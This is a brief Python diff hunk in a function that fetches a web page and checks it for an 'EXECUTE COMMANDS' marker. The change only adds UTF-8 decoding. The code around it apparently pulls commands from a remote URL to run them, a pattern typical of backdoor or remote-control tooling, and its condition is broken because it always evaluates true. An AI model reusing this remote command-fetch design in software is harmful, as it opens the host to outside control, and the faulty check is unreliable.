@@ -377,7 +377,7 @@ def execute_command():
             if url != "":
                 try:
                     req = urllib.request.Request(url)
-                    html = urllib.request.urlopen(req).read()
+                    html = urllib.request.urlopen(req).read().decode('utf-8')
                     # if we have execute commands in URL
                     if "EXECUTE COMMANDS" in html or "EXECUTE COMMAND":
                         # here we check first to see if we need to execute or we have already
